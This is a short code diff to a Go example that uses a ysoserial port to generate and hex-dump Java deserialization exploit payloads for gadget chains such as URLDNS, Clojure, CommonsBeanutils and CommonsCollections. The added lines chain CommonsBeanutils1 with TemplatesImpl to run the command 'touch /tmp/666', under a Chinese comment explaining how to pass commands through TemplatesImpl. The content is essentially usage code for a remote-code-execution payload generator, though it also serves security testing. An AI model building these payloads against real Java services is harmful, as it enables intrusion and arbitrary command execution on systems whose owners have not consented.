@@ -12,13 +12,16 @@ import (
 )
 
 func main() {
-    	// If you need to use a Gadget implemented by the TemplatesImpl class, you can call the return value of the TemplatesImpl function as a parameter.
-	fmt.Println(hex.Dump(ysoserial.TemplatesImpl("example command")))
+    	
+	
 
 	fmt.Println(hex.Dump(ysoserial.URLDNS("example domain")))
 	fmt.Println(hex.Dump(ysoserial.Click1([]byte("example bytes"))))
 	fmt.Println(hex.Dump(ysoserial.Clojure("example command")))
-	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils1([]byte("example bytes"))))
+
+        // 使用 TemplatesImpl cb1执行命令 example bytes的可以使用 TemplatesImpl 来传入参数
+	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils1(ysoserial.TemplatesImpl("touch /tmp/666")))
+
 	fmt.Println(hex.Dump(ysoserial.CommonsBeanutils2([]byte("example bytes"))))
 	fmt.Println(hex.Dump(ysoserial.CommonsCollections1("example command")))
 	fmt.Println(hex.Dump(ysoserial.CommonsCollections2([]byte("example bytes"))))
